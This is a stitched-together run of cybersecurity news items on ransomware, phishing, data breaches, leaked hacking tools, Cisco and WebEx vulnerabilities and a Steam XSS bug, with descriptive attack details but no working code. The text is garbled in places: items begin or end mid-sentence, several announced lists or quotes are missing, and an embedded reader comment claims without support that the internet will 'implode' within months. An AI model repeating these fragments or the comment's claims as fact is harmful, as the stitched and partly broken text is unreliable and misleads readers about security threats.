Researchers at Kaspersky Lab who investigated the infrastructure supporting Lurk said there was little doubt that the criminals behind Lurk were also responsible for Angler’s constant development and profit-making.
Since the end of the summer, however, exploit kit development has all but ended while attackers have returned to large-scale spamming campaigns and a resurgence of macro malware to move attacks along.
“Regarding the why, I don’t know for sure,” Kafeine said.
“Either it’s harder to code those, [or] those who were providing fully working exploits (for Angler for instance) are not anymore into this.
“I think [exploit kits] have not been so far behind in years”.
Microsoft patched this on Nov 8th, bug the huge problem is that whenever you buy a new computer, it doesn’t come with that pacth… You have to run the updates once you set up the new computer.
And from what I have been finding over the last 6 months, is that the moment you open a brand new laptop with windows 10 and start to try to update it, the vulnerability is wide open for attack.
The WORST part is that if you are a regular person not knowing anything about security, and you set up windows 10 with the “express settings” the computer is setup to connect to any open wifi hotspot and Bluetooth devices!
So if you live in NYC or any heavy populated area, or your home wifi is already infected by Miria Botnet, you are screwed instantly… I have proof that it is happening to everyone and no one knows it.
The internet is going to implode within the next 3-4 months and the government will have to shut it down.

UK police are warning that fraudsters are posing as Department of Education officials in order trick schools into installing ransomware.
An Action Fraud notice claimed that the fraudsters have been cold calling education institutions pretending to be government officials and socially engineering the victim into giving them the email address of the head teacher, in order to send across “sensitive information”.
The resulting email contains a .zip attachment loaded with ransomware that will apparently demand up to £8000 to recover the files.
Action Fraud claimed similar cases have been noted where the fraudsters pretend to be calling from the Department for Work and Pensions, or even telecom providers.
The newly reported incidents represent an escalation in tactics designed to get ransomware on the networks of targets presumably selected because they may be relatively poorly secured, and be willing to pay a high penalty to gain access back to their data.
“Once again, hackers have preyed on the weakest link in security – the end-user – but this is not where the fault lies.
It’s unfair to expect busy teachers to be able to tell the difference between an email from the Department of Education and these sophisticated mimics,” argued Fraser Kyne, EMEA CTO at Bromium.
“Hackers are clever and convincing con artists, yet the industry continues to try and convince us that they can be defeated through detection tools and user education.
As we can see from the rise in such attacks, this approach is neither realistic nor effective”.
In related news, new tactics designed to deliver the Petya variant GoldenEye have been discovered using fake job application emails.
The new campaign is designed to target HR staff, with the ransomware hidden in a malicious attachment masquerading as a CV, according to Check Point.
The emails also contain a harmless PDF as covering letter in order to lull the recipient into a false sense of security, the vendor claimed.

Israeli mobile forensics firm Cellebrite has announced that it has suffered a data breach following an unauthorized access to an external web server.
“The impacted server included a legacy database backup of my.Cellebrite, the company’s end user license management system.
The company had previously migrated to a new user accounts system.
Presently, it is known that the information accessed includes basic contact information of users registered for alerts or notifications on Cellebrite products and hashed passwords for users who have not yet migrated to the new system,” the company stated, and added that it is still investigating the attack.
They are also notifying affected customers, and advising them to change their passwords.
The confirmation comes a few hours after Motherboard released general information about 900 GB of data that they obtained and has supposedly been stolen from the firm.
The cache includes alleged usernames and passwords for logging into Cellebrite databases connected to the company’s my.cellebrite domain,” the publication noted.
“The dump also contains what appears to be evidence files from seized mobile phones, and logs from Cellebrite devices”.
The hacker that shared the data with the publication and is apparently behind the breach also noted that access to the compromised servers has been traded among hackers in IRC chat rooms, so it’s possible that other persons have exfiltrated potentially sensitive data.
“The Cellebrite breach shows that anyone can be hacked, even firms whose bread and butter is data exfiltration.
And Cellebrite isn’t the first organization of this type to be targeted – Hacking Team and Gamma International have both experienced similar attacks by groups opposed to government surveillance,” Tony Gauda, CEO of ThinAir, commented for Help Net Security.
“While the 900 GB of data hasn’t been released publicly, it’s safe to assume that the information is highly sensitive.
Besides customer information, the hackers managed to retrieve technical data, which could have serious repercussions if it were to fall into the wrong hands.
Incidents such as this are the cyber equivalent of robbing a gun store, and I wouldn’t be surprised if the proprietary info stolen eventually made its way online.
Demand for advanced hacking tools and techniques has never been higher and until these firms start securing their digital arsenals with technology capable of rendering data useless when it’s compromised, they will continue to find themselves in the crosshairs of hackers”.
Cellebrite’s name has become widely known after reports that the company has been asked for help to exfiltrate data from the locked iPhone belonging to Syed Farook, one of the San Bernardino shooters.

On Thursday, the Shadow Brokers dumped them online after an attempt to sell these and other supposedly Windows and Unix hacking tools for bitcoin.
The Shadow Brokers made news back in August when they dumped hacking tools for routers and firewall products that they claimed came from the Equation Group, a top cyberespionage team that some suspect works for the NSA.
Those tools contained several previously unknown and valuable exploits, lending credibility to the hacking group's claims, according to security researchers.
The Shadow Brokers' latest dump includes 61 files, many of which have never been seen by security firms before, said Jake Williams, founder of Rendition InfoSec, a security provider.
He’s been examining the tools, and said it’ll take time to verify their capabilities.
His initial view is that they’re designed for detection evasion.
For instance, one of the tools is built to edit Windows event logs.
Potentially, a hacker could use the tool to selectively delete notifications and alerts in the event logs, preventing the victim from realizing they’ve been breached, he said.
“If you simply remove a record or two, then even an organization that is following the best security practices, presumably, wouldn’t notice the change,” he said.
On Thursday, the Shadow Brokers said they released the Windows hacking tools for free because a Kaspersky Lab’s antivirus product could already flag them as harmful.
The clandestine group previously tried to auction off a whole set of hacking tools for 1 million bitcoins or what was at the time US$584 million.
But after several months, that auction only managed to generate 10 bitcoins.
“Despite theories, it always being about bitcoins for TheShadowBrokers,” the group said in broken English in their supposed final message.
However, Williams believes the Shadow Brokers are likely spies working for the Russian government.
This latest dump was a message to the U.S, he said.
In recent weeks, U.S. intelligence agencies have been claiming the Kremlin tried to influence the U.S. election.
Based on those findings, President Barack Obama has already ordered sanctions against Russia and vowed covert action.
“If they are Russian, this is a shot across the bow,” Williams said.
It’s unclear how the Shadow Brokers managed to steal the hacking tools.
The group has said their arsenal of supposed Linux and Windows-based hacking tools is still up for sale at 10,000 bitcoins.
On Thursday, Microsoft said it's investigating this latest batch of hacking tools that have been released.

 malware -- and they're even mimicking internal corporate travel and expenses systems to steal personal details from the victims they target.
While cybercriminals using the lure of fake travel itineraries to dupe staff working in sectors reliant on shipping goods or employee travel isn't new,  researchers have uncovered a particularly advanced phishing attack.
Discovered by cybersecurity researchers at Barracuda Networks, this airline phishing attack uses a variety of techniques to capture sensitive data from victims and deploy an advanced persistent threat.
The email from the attacker impersonates a travel agency or an employee in the target's own HR or finance department.
The email's subject line claims it's a forwarded message about a flight confirmation, stating the airline, the destination, and the price of the flight.
All three of these elements are carefully researched by the attackers, who select them specifically according to the target, in order to make the email look legitimate in context of the company and the email recipient.
Taking the time to tailor phishing emails in this way works: these messages are opened 90 percent of the time, one of the highest success rates for phishing attacks, according to Barracuda.
Once opened, the email presents the target with an attachment in the form of a PDF or Microsoft Word document.
The attachment purports to be a flight confirmation or receipt but, of course, it's neither of these things.
When the target opens the attachment, the malware runs immediately, dropping an advanced persistent threat into the network, and enabling the attacker to stealthily monitor the infected organisation -- likely with the aim conducting espionage and stealing data.
Another variant of this attack which, instead of dropping malware to stealthily steal data, uses phishing links to directly take sensitive information from the victim.
These phishing links are ultimately designed to trick the victim into supplying sensitive corporate credentials, which the attackers will then use to infiltrate the company network, databases, and emails in order to steal information.
Cybersecurity researchers warn that the combined use of impersonation, malware, and phishing is particularly dangerous because these methods complement one another, enabling the attacker to essentially gain control of the network.
At this stage, the attackers can stealthily conduct espionage or even drop additional malware and ransomware.
Sometimes it can be very difficult to identify a phishing email, but the likes of  sandboxing and advanced persistent threat prevention combined with employee training and awareness can increase the chances of preventing attacks from compromising the network.

Scammers are flooding the United States with Chinese-language robocalls, causing major headaches from coast to coast.
These new robocalls are a lot like the ones you’ve already gotten on your phone at all hours of the day and night: Your phone rings, you pick up, and after a brief pause or maybe a quiet click or beep, a prerecorded voice message meets your ears. The recording, which often sounds like a young woman, usually delivers a message about lowering credit-card rates or buying into cheap health insurance.
If you fall for the bait, you’re transferred to a live human who will try anything to get you to hand over your credit-card or bank account info.
The important thing to remember is that sales robocalls are illegal in the United States. So, don’t expect the person on the other end of the line to follow through on whatever deal they claim to offer. You’re much more likely to fall victim to an identity theft scam or credit-card fraud than to score a deal from one of these spam callers.
The new Chinese-language version of these calls targets immigrants. The robocalls deliver a recorded message claiming to be from the Chinese consulate, saying the recipient is in trouble with Chinese officials, or sometimes that a package is waiting at the Chinese consulate that needs to be picked up.
Then, the robocall asks for a deposit or fee, demanding a credit-card number or bank information. Sometimes the robocall or live operator who follows it makes a threat, suggesting that more trouble will come if the person doesn’t willingly hand over their financial info, according to the Federal Trade Commission.
In New York City alone, police estimate at least 30 residents had been scammed out of $3 million, according to National Public Radio. 
The Chinese Consulate General in New York says it has posted dozens of alerts on its website warning about the scams. ""We would like to restate that the Consulate General in New York would not ask for personal information, deliver parcel pick-up notice or ask people to answer inquiries from police department by way of phone calls. The Consulate General would not ask for bank account information,"" it warned.
The scammers are also upping the ante with a tech trick called “spoofing.” Spoofed calls can fake caller ID numbers, making them look like they’re coming from a familiar number, nearby area code, your hometown or in this case, the Chinese consulate, according to the Federal Communications Commission, which also issued an alert.
So, even if you don't speak Chinese, why would you get so many calls? The scammers don’t know who they’re calling, and it costs virtually nothing to place a phone call, so if they hit a few thousand English-speaking phones for every one Chinese speaker that’s totally fine with them.
This scam uses many of the same ploys used on unsuspecting English speakers, say in the scam where the caller pretends to be from the IRS and is demanding payments on back taxes that don’t really exist.

A NEW DVLA car tax scam is doing the rounds online which could see motorists duped into entering sensitive information and being ripped off by criminals. Here’s what to do if you receive this message.
DVLA car tax scam are not a new thing and every couple of months a new one does the rounds.
Criminals pose as the Driver and Vehicle Licensing Agency in a bid to extort motorists of their cash by requesting this bank details.
These crooks usually try to achieve this by threatening a monetary punishment of some sort or in other cases by stating that the driver is entitled to a refund.
The problem for some motorists could fall for the fraudulent messages especially as they often look fairly professional and can even contain the logo of the DVLA
Motorists Jason Price, however, was not fooled by the latest attempt by fraudsters trying to get him to hand over his details.
Mr Price tweeted a link to the email that he received from the criminal pretending to be the DVLA.
The subject of the email is “You are not up-to-date with your vehicle tax” followed by a bogus item reference number, which presumably is to, in some way, make the email seem more legitimate.
The contents of the email claim that the driver is not up to date with their vehicle tax and states that this is their ‘last chance’ to pay the remainder of the fee.
It reads: “Our records show that you are not up-to-date with your vehicle tax.
“This is a reminder (V11) and a ‘last chance’ warning letter from us.
“Tax your car, motorcycle or other vehicle today to avoid unpleasant consequences.
“You must tax your vehicle even if you don’t have to pay anything, for example if you’re exempt because you’re disabled.
“You’ll need to meet all the legal obligations for drivers before you can drive.”
It also states that “You can be fined up to £1,000 if you do not renew your car tax”
The DVLA has issued numerous warnings to customers in the past about how it will never contact the motorist in this way.
“#SCAM WARNING: We're reminding customers that the only official place to find our services and information is on http://GOV.UK
“Cyber scams are common so we want to help our customers to spot fraudulent activity.”
If you receive an email or message like this you should either report it or instantly delete it and not click the link in the message.
If you’re unsure on the validity of a message then you can ring the licensing agency.

University College London, one of the world's leading universities, has been hit by a major cyber-attack.
The university describes it as a ""ransomware"" attack, such as last month's cyber-attack which threatened NHS computer systems.
The attack was continuing on Thursday, with access to online networks being restricted.
The university has warned staff and students of the risk of data loss and ""very substantial disruption"".
University College London (UCL) is a ""centre of excellence in cyber-security research"", a status awarded by the GCHQ intelligence and monitoring service.
The central London university, ranked last week in the world's top 10, says that a ""widespread ransomware attack"" began on Wednesday.
It was first blamed on so-called ""phishing"" emails, with links to destructive software. 
But later the university suggested it was more likely to be from contact with a ""compromised"" website, where clicking on a pop-up page might have spread a malware infection.
Ransomware attacks are where computer systems are locked and threatened with damaging software unless payments are made.
Students and staff were warned that ""ransomware damages files on your computer and on shared drives where you save files"" and were told not to open any suspicious attachments.
The university says that it believes the risk of further infection has been contained, but it is urging staff and students to help with efforts to reduce any ""further spread of this malware"".
Universities, which often carry out commercially sensitive research, have become frequent targets for cyber-attacks.
""However, what makes this attack interesting is the timing,"" said Graham Rymer, an ethical hacker and research associate at the University of Cambridge.
""Hackers tend to target people who will be desperate to get access to their data and are, therefore, more likely to pay the ransom.
""Currently there are a lot of students who will be putting the final touches to their dissertations, so it could be that they were the targets.""
Mr Rymer said UCL seemed to have responded well to the attack and had ""locked it down pretty well"".
""One thing UCL did is to quickly switch all drives in the system to ""read-only"" following the attack, which essentially prevented the malware from doing real damage."" 
Mr Rymer said UCL may not have been the only intended target as he had seen other businesses facing the same malware.
Last month, the National Health Service in England and Scotland was subject to a significant ransomware cyber-attack, as part of a global wave of attacks.

As thousands of freshmen move into their dorms for the first time, there are plenty of thoughts rushing through their minds: their first time away from home, what cringey nickname they're gonna try to make a thing, if there are any parties before orientation kicks off.
One thing that probably isn't on their minds is whether they're going to get hacked.
But that's all Carnegie Mellon University's IT department thinks about. Back-to-school season means hordes of vulnerable computers arriving on campus.
The beginning of the semester is the most vulnerable time for a campus network, and every year, with new students coming in, schools have to make sure everything runs smoothly. Carnegie Mellon's network gets hit with 1,000 attacks a minute -- and that's on a normal day.
Cybersecurity is an increasingly important aspect of our everyday lives, with technology playing a massive role in nearly everything we do. Universities have been vulnerable to attacks in the past, with cybercriminals stealing student and faculty databases and hackers vandalizing university websites.  
Students are often targets for hackers, even before they're officially enrolled. Considering how much money flows into a university from tuition costs, along with paying for room and board, criminals are looking to cash in on weak campus cybersecurity. A bonus for hackers: Admissions offices often hold data with private information like student Social Security numbers and addresses, as well as their families' data from financial aid applications.

Phishing happens when hackers steal your passwords by sending you links to fake websites that look like the real deal. It's how Russians hacked the Democratic National Committee during the presidential election, and it's a popular attack to use on universities as well.
The latest warning, sent Monday, called out malware hidden in a document pretending to be from Syracuse University's chancellor.
Digging through my old emails, I found about 20 phishing warnings that had gone out during the four years I'd been there. Syracuse declined to comment on phishing attacks against the school, but in a 2016 blog post, it said the attacks were ""getting more frequent, cunning and malicious."" 
The school is not alone. Duo Security, which protects more than 400 campuses, found that 70 percent of universities in the UK have fallen victim to phishing attacks. Syracuse, which uses Duo Security, fights phishing attacks with two-factor authentication, which requires a second form of identity verification, like a code sent to your phone. But it just rolled out the feature last year.
Kendra Cooley, a security analyst at Duo Security, pointed out that students are more likely to fall for phishing attacks because they haven't been exposed to them as frequently as working adults have. Also, cybercriminals know how to target young minds.
""You see a lot of click-bait phishing messages like celebrity gossip or free travel,"" Cooley said.
All students at Carnegie Mellon are required to take a tech literacy course, in which cybersecurity is a focus, said Mary Ann Blair, the school's chief information security officer. The school also runs monthly phishing campaigns: If a student or faculty member falls for the friendly trap, they're redirected to a training opportunity.
When your network is being hit with at least two phishing attempts a day, Blair said, it's a crucial precaution to keep students on guard.
""It's just constantly jiggling the doorknobs to see if they're unlocked,"" Blair said. ""A lot of it is automated attacks."" 

It's not just the thousands of new students that have university IT departments bracing for impact, it's also their gadgets.
""All these kids are coming on campus, and you don't know the security level of their devices, and you can't manage it, because it's theirs,"" said Dennis Borin, a senior solutions architect at security company EfficientIP. A lot of university IT teams have their hands tied because they can't individually go to every student and scan all their computers.
Borin's company protects up to 75 campuses across the United States, and it's always crunch time at the beginning of the semester.
""If I was on campus, I wouldn't let anybody touch my device,"" Borin said. ""So if somebody has malware on their device, how do you protect against an issue like that?""
Instead of going through every single student, Borin said, his company just casts a wide net over the web traffic. If there's any suspicious activity coming from a specific device, they're able to send warnings to the student and kick him or her off the network when necessary.
Keeping school networks safe is important for ensuring student life runs smoothly. A university that had only two people on its team reached out to EfficientIP after it suffered an attack.
All of the school's web services were down for an entire week while recovering from the attack, Borin said.

Scam artists love to take advantage of timing, and the back-to-school season is a great opportunity for them.
There was an influx of fake ransomware protection apps when WannaCry hit, as well as a spike in phony Pokemon Go apps stuffed with malware during the height of the game's popularity. If there's a massive event going on, you can bet people are flooding the market with phony apps to trick victims into downloading viruses. A quick search for ""back to school apps"" in August found 1,182 apps that were blacklisted for containing malware or spyware, according to security firm RiskIQ.   
Researchers from the company scanned 120 mobile app stores, including the Google Play store, which had more than 300 blacklisted apps. They found apps for back-to-school tools; themes and wallpapers for your device; and some apps that promised to help you ""cheat on your exams.""
Though most of the blacklisted apps are poorly made games, others pretend to help you be a better student.
Other warning signs to watch out for when it comes to sketchy apps are poorly written reviews and developers using public domain emails for contacts, Risk IQ said. For any educational apps, like Blackboard Learn, you should always check the sources and look for the official versions.  
New students coming to school have enough to worry about. Let's hope a crash course in cybersecurity is enough to ensure they make it to graduation without getting hit by hacks.

A Twitter user by the name @EugenePupov is trying to take credit for the massive phishing attack that hit Gmail users last night, and which attempted to trick users into granting permission for a fake Google Docs app to access their Gmail inbox details.
While Google intervened and stopped the self-spreading attack about an hour after it started — which is a pretty good response time — questions still linger about who was behind it.
If there's one thing we know for sure, is that the fake Google Docs app was registered using the email eugene.pupov@gmail.com.
The owner of the aforementioned @EugenePupov Twitter account, who took credit for the attacks, claimed in a series of tweets [assembled below] it was only a test.
While some might think this is an open&close case, it is not quite so. For starters, the Twitter account was registered yesterday, on the same day of the attack, which isn't necessarily suspicious, but it's odd.
Second, if you would try to reset that Twitter account's password, you'll see that the Twitter account isn't registered with the same address used in the phishing attacks.
Registering a Twitter account with the eugene.pupov@gmail.com email wouldn't haven been possible either way, as this Gmail address isn't registered at all.
Furthermore, a Coventry University spokesperson told Bleeping Computer today that no person with the name Eugene Pupov is currently enrolled at their institution. Later they confirmed it on Twitter.
If things weren't shady enough, the Twitter account used a profile image portraying a molecular biologist named Danil Vladimirovich Pupov, from the Institute of Molecular Genetics, at the Russian Academy of Sciences.
When other users called out [1, 2] the Twitter account for using another person's image, the man behind the @EugenePupov account simply changed it to a blank white image.
To clarify what exactly is going on with the Twitter account images, we've reached out to the real Danil Pupov hoping for some answers, as we weren't able to find any good reasons for why a molecular biologist would fiddle around with Gmail spam campaings and fake Google Docs apps.
As things are looking right now, it appears that someone is either in the mood for a prank, or the real person behind the attack is trying to plant a false flag and divert the attention of cyber-security firms investigating the incident [1, 2].
As for Google, after a more thorough investigation, the company says that only 0.1% of all Gmail users received the phishing email that contained the link to Pupov's fake Google Docs app that requested permission to access users' inboxes. That's around one million users of Gmail's one billion plus userbase.

NHS hospital trusts in England reported 55 cyber attacks in 2016, according to data obtained by the BBC.
The figures come from NHS Digital, which oversees cyber security, and show an increase on 16 attacks in 2015.
NHS Digital said the figures showed a ""rise in reporting, not necessarily a rise in cyber attacks"".
But Oliver Farnan, from the Oxford Cyber Security Centre, said ransomware attacks had become more common.
'The risk is going to increase'
Ransomware is software that locks computer systems and then demands a ransom to unlock the data.
Oxford University Hospitals NHS Foundation Trust (OUH) repelled five ransomware attacks in 2016.
""That is something a number of hospitals have seen and is potentially quite worrying,"" said Dr Chris Bunch from OUH.
He added: ""Across the health service we are still to a very large extent paper-based... and as we move increasingly towards digital records the risk is going to increase.""
Leeds Teaching Hospitals NHS Trust reported four ransomware attacks in 2016, and University Hospitals Bristol NHS Foundation Trust and Kings College Hospital NHS Foundation Trust sustained three ransomware attacks each last year.
No patient data was lost in any of the attacks on the trusts and a spokesperson for Kings College Hospitals Trust said it had a cyber security response plan that it continually reviewed and monitored.
Oliver Farnan from the Oxford Cyber Security Centre, said it was hard to know if enough money was being spent on security in the NHS.
""Money is only really spent on security once everything else is up and running and in place... it always comes second,"" he said.
But David Emm, principal security researcher at internet security firm Kaspersky Lab, said basic steps such as backing up data could make a difference.
""Ransomware is a very blunt instrument, if you have a back-up of data then you are not in a position where people can extort money in that way,"" he said.
However, Mr Emm said public bodies faced specific challenges, and added that money was an issue.
""They have lots of people accessing the systems, there is lots of data moving in and out of the organisation, that does actually make it harder to secure that information,"" he said.
NHS Digital said it had established CareCERT which issues notices about the national threat level and publishes advice on good practice.
It said its launch in October 2015 has contributed to the increase in the reporting of cyber attacks, and that more than 100 organisations had received on-site assessments to improve security.

Last month, we received a few queries asking about a strain of ransomware going by the name of Satan.
Those queries were along the lines of, “What do you detect it as?”
The simple answer is Troj/Ransom-ECZ, which is what we replied back then, but there’s a backstory to the Satan malware family that we thought was worth covering, too.
Cybercriminals have long used themes like the devil, the occult and what you might rather loosely call “the dark arts” as inspiration for malware names: Dark Avenger, Necropolis, Mydoom, Natas (which is Satan backwards) and SatanBug are just a few examples
But there’s one aspect of the Satan ransomware that isn’t old-school, and that’s what we’re looking at in this article: its business model.
In its own words, the malware part of Satan is simply explained:
Satan is a ransomware, a malicious software that once opened in a Windows system, encrypts all the files, and demands a ransom for the decryption tools.
Satan has brazenly copied the business model of many legitimate online services such as iTunes and eBay: joining up is free, but you pay-as-you-go on a percentage basis when you put business through the site.
The Satan service claims to:
The service (we'll use that word without quotation marks, but you may infer them if you wish) even supports optional two-factor authentication based on a public-private key pair, just like SSH, and a CAPTCHA to make automatic mass signups more difficult.
Once you have a login, you can begin to generate ransomware samples, tailored to your own price point.
You can choose an initial ransom, starting at BTC 0.1 (about $125 on 2017-03-07), the number of days you want to keep the price at its starting point, and a ""ramp up"" factor by which the ransom will increase after the initial period:
Once you've created a sample, you can not only download it to start attacking potential victims, but also generate a series of supporting files that will help you to use it in an attack.
That way, the files you publish online for your victims to download won't look obviously like Windows programs (EXE files).
Of course, once you have scrambled your ransomware files, you can't just send the files or links to your victims and expect them to work, because the files will arrive in scrambled form and won't run.
The Satan service helps you over that step, too, by creating either an HTML page or a Microsoft Word macro to do the job of downloading, unscrambling and auto-launching the decoded malware.
You then convert the HTML into CHM (compiled HTML) format or embed the generated Word macro into a Word document, thus creating a malware downloader file you can send as an email attachment and entice your victim to open it.
If you do manage to infect a prospective victim, they’ll be instructed to pay the ransom you specified, but into a bitcoin wallet operated by the crooks:
You’re then expected to trust the crooks to be honest about all the payments they receive, and to cough up 70% of every ransom payment into a bitcoin address you supply them.
We shouldn’t have to say this, but the answer is dead simple: DON’T.
Deliberately sending out malware in the hope of infecting victims is illegal in most jurisdicitions; actually infecting them just makes a bad thing worse; and demanding money with menaces after infecting them is worse still.
If you try this and get caught, don’t expect too much sympathy from the court.

Malware posing as legitimate software for Siemens control gear has apparently infected industrial equipment worldwide over the past four years.
The cyber-nasty is packaged as software to be installed on Siemens programmable logic controllers (PLC), we're told.
At least 10 industrial plants – seven in the US – were found running the infected software, a study by industrial cybersecurity firm Dragos claims.
According to the Maryland-based biz, this particular malware was specifically thrown at industrial control equipment.
Exactly what it does, or did, is not explained, although it is described as ""crimeware"".
Dragos CEO Robert Lee writes:
Starting in 2013, there were submissions from an ICS environment in the US for Siemens programmable logic controller control software.
The various anti-virus vendors were flagging it as a false positive initially, and then eventually a basic piece of malware.
In short, there has been an active infection for the last four years of an adversary attempting to compromise industrial environments by theming their malware to look like Siemens control software.
However, each new IP address punches another hole in the metaphorical wall that separates Information Technology (IT) and Operational Technology (OT).
Having established IT connectivity, it's difficult to put the genie back in the bottle and each of these avenues is a potential point of weakness that can be compromised – by hackers burrowing in or malware (such as ransomware) detonating internally and then radiating out.""
Andrew Cooke, head of cyber consulting at Airbus Defence and Space CyberSecurity, added: ""Malware is prevalent in a wide range of industrial systems, often spread by an infected USB stick or by unauthorized remote access.
But while the majority of malware found in these systems is low level, it can still pose a serious risk for the organizations concerned.

A special operational group existed in the CIA named Umbrage, which was tasked with reviewing public malware and embedding selected features into custom CIA hacking tools.
According to one document, the Umbrage team and its purpose were described as follows:
The Vault 7 dump, which WikiLeaks claims it received from government contractors and hackers, did not include any actual malware samples, but only the internal CIA documentation.
The Umbrage documentation hints the CIA may have reused malware code from multiple malware families.
Most entries are attributed using a generic ""Known Malware"" tag, but for some, the malware's name is included.
According to leaked documents, the CIA ""borrowed"" code from:
According to another Umbrage file, the CIA had also explored the idea of using code from the Hacking Team, an Italian spyware maker that sold malware to government agencies, which was hacked in 2015 and its malware dumped online.
The dumped document reveals the CIA collected the Hacking Team data and in August 2015, two months after the hack, explored the idea of running tests and mapping its capabilities.
The CIA must have found something interesting, because the redacted document reveals that by September 2015, the Agency decided to expand its search to all the Hacking Team files, including emails and internal docs, not just the malware and exploit samples.
While the leaked files hint the CIA reused some of this code to cut costs, WikiLeaks proposes another theory.
According to the organization, the CIA reused code from public malware samples to ""misdirect attribution by leaving behind the 'fingerprints' of the groups that the attack techniques were stolen from.""
WikiLeaks also said the Umbrage group reused code from malware stolen from other states, including the Russian Federation, information which many publications are now using to question the US' attribution of last year's DNC hacks to Russia.
It was common knowledge that xagent was ""in the wild"" so anyone could have used it to hack the DNC.
We were told to take it on faith by the US .gov that it was Russia.
It's possible NSA/FBI/CIA/DIA were able to seed the TOR network and unmask the IP's, but it's also common for actual Russian agents to bounce their traffic off numerous satellites making traces near impossible.

Cisco has plugged two severe vulnerabilities affecting its Digital Network Architecture (DNA) Center software. 
Appliances running Cisco's DNA Center software before Release 1.1.4 are vulnerable to an authentication bypass that could allow a remote attacker to ""take complete control"" of its identity management functions.
Network admins can use the DNA Center interface to add new devices to the network and manage them based on enterprise policies. DNA Center is part of Cisco's toolkit for internet-based networking.
Lax security restrictions on key DNA management functions mean an attacker could send a valid identity management request to an affected system and then change existing system users or create new users, according to Cisco.
The flaw, which is tracked as CVE-2018-0448, is rated critical and has a Common Vulnerability Scoring System (CVSS) v 3.0 rating of 9.8 out of 10. 
It's fixed in release 1.1.4 and later and since there are no workarounds, admins will need to update to these releases to fix the bug.
Cisco also fixed another critical DNA Center flaw, CVE-2018-15386, which could give a remote attacker direct access to core management functions.
An attacker could exploit the bug by directly connecting to exposed DNA Center services and from there obtain or change critical system files.
This bug is due to insecure default configurations affecting DNA Center release 1.1 Again, there are no workarounds for the bug, so admins will need to update to release 1.2 and later.
Both flaws were found during internal testing. Cisco is not aware of any exploits in the wild for the flaws.
Cisco has also fixed a critical flaw affecting Cisco Prime Infrastructure (PI) that could let a remote attacker upload any file they wishwithout requiring authentication. The file could be used to execute commands.
On PI, Trivial File Transfer Protocol (TFTP) is enabled by default and accessible from the web interface, which an attacker could use toupload a malicious file.
Customers should check Cisco's advisory to determine whether they're running a fixed release. It also has workarounds for some releases.
The flaw was reported by independent security researcher Pedro Ribeiro through Beyond Security's SecuriTeam Secure Disclosure program. 
Beyond Security notes in its detailed report about the PI issue that Ribeiro identified two flaws but only one was fixed in Cisco's patch.
""The first vulnerability is a file-upload vulnerability that allows the attacker to upload and execute JSP files as the Apache Tomcat user.""
""The second vulnerability is a privilege escalation to root by bypassing execution restrictions in a SUID binary.
""From our assessment the provided fix only addresses the file uploading part of the exploit, not the file inclusion, the ability to execute arbitrary code through it or the privileges escalation issue that the product has.""
Cisco also released patches for 33 more high- and medium-severity flaws affecting WebEx, SD-WAN products, and its ASA security appliances.

Update, Cisco will take a second crack at addressing a vulnerability in WebEx that can be exploited to execute malicious code on a vulnerable installation.
Switchzilla has issued a new fix to address CVE-2018-15442, a command injection bug in its video conference software that allows a local attacker to their elevate privileges, and then execute code by injecting commands through the software update component of the WebEx Meetings Client.
The bug was traced back to the failure by Webex Meetings to properly check arguments passed via its update service commands. Thus a miscreant could run an update command with specially crafted arguments to ultimately execute code with system privileges. This means rogue logged-in users or malware on a Windows system could leverage WebEx to completely hijack the machine.
Cisco had hoped to plug the vulnerability in October with a patch that was thought to have resolved the flaw. However, software-breakers at SecureAuth found that Switchzilla failed to account for DLL preloading.
By sticking the malicious commands inside a DLL file and then executing the update program with that library loaded, an attacker would be able to circumvent the patch and then exploit the flaw as before to execute commands with system-level clearance.
""The vulnerability can be exploited by copying to an a local attacker controller folder, the ptUpdate.exe binary. Also, a malicious dll must be placed in the same folder, named wbxtrace.dll,"" SecureAuth explained in its disclosure today.
""To gain privileges, the attacker must start the service with the command line:""
Fortunately, the flaw was privately disclosed to Cisco, giving the teleconferencing vendor time to get out a fix prior to this bug going public. Those running Webex Meetings on their Windows machines should update as soon as possible.
While the flaw isn't as severe as a remote code bug that could be exploited without any user interaction, the fact it has now been patched twice and has working proof-of-concept code public should make patching a priority.

Since last year’s revelation that attackers have compromised SWIFT software of Bangladesh’s central bank and used it to perform fraudulent transfers worth tens of millions, news about similar attacks – both successful and not – have become a regular occurrence.
Attackers usually use banks’ compromised SWIFT system to send information about fraudulent financial transactions, but in attacks aimed at three government-owned banks in India, they chose to create fake trade documents such as letters of credit and guarantees.
A letter of credit allows the sellers to be sure that they will get paid once they prove that the sold goods have been provided, as the buyer’s bank – the institution that issued the letter of credit – is obliged to release the money, even if the buyer is unable to make payment.
Bank guarantees are documents that guarantee that the bank will release an agreed-upon sum either to the seller or the buyer in case the other party ultimately can’t provide the goods or the cash.
A source close to the investigation told Economic Times that there have been no monetary losses or ransom demands as of yet.
He or she posits that the hackers were planning to use the forged documents to get cash from offshore banks or carry out trade of prohibited or illegal commodities.
It’s still unknown how the compromises were effected, and it’s possible that other Indian banks have been hit as well.
The Reserve Bank of India has been notified of the breaches, and it has directed several banks to check whether the trade documents they sent via SWIFT have a match in their core banking system.

The bug could've likely been exploited to make a self-spreading worm too, according to hackers and security researchers.
Steam's operator Valve announced that it fixed the bug earlier today, but with over 125 million monthly active users on its platform, the exploit could have wreaked havoc for thousands of people, and for the company itself.
""Anyone who views a specially crafted profile gets popped,"" a white hat hacker who has found several bugs in Steam in the past, and asked to remain anonymous, told me in a Twitter DM.
Several users and security researchers noticed this week that it was possible to put malicious javascript code inside a Steam user's profile page, and the code will execute whenever someone visits that profile page, without any need for the victim to click anywhere.
This type of bug is known as a cross-site scripting vulnerability, or XSS, a problem that's plagued Steam for years.
""Phishing scams and virus downloads are possible at the very least, but if account take overs are possible, that's about as bad as XSS gets,"" Jeremiah Grossman, a web security expert, said in a chat.
A Valve spokesperson said the bug was fixed on Tuesday at noon, but there's no telling how long the door was open for hackers to exploit it.
(The spokesperson did not immediately respond to a request for comment.)
The bug was so bad that the moderators of the Steam subreddit told users to refrain from visiting other user's profiles.
""Do NOT click suspicious (real) steam profile links and Disable JavaScript on Browser,"" a moderator wrote in the warning post.
Grossman and Jake Davis, a former LulzSec hacker, confirmed that the bug existed as of Tuesday morning and analyzed the potential attacks that bad guys could do if they were to exploit it.
""If something like this were to be found on Google or Facebook, it would be a high-severity issue,"" said Grossman, who's the Chief of Security Strategy at security firm ‎SentinelOne.

F-Secure says it cannot prove which country was behind the hack but the group had links to 'entities' in China, Russia and Ukraine
The UK Foreign Office was targeted by a group of determined and well-funded hackers over several months last year. 
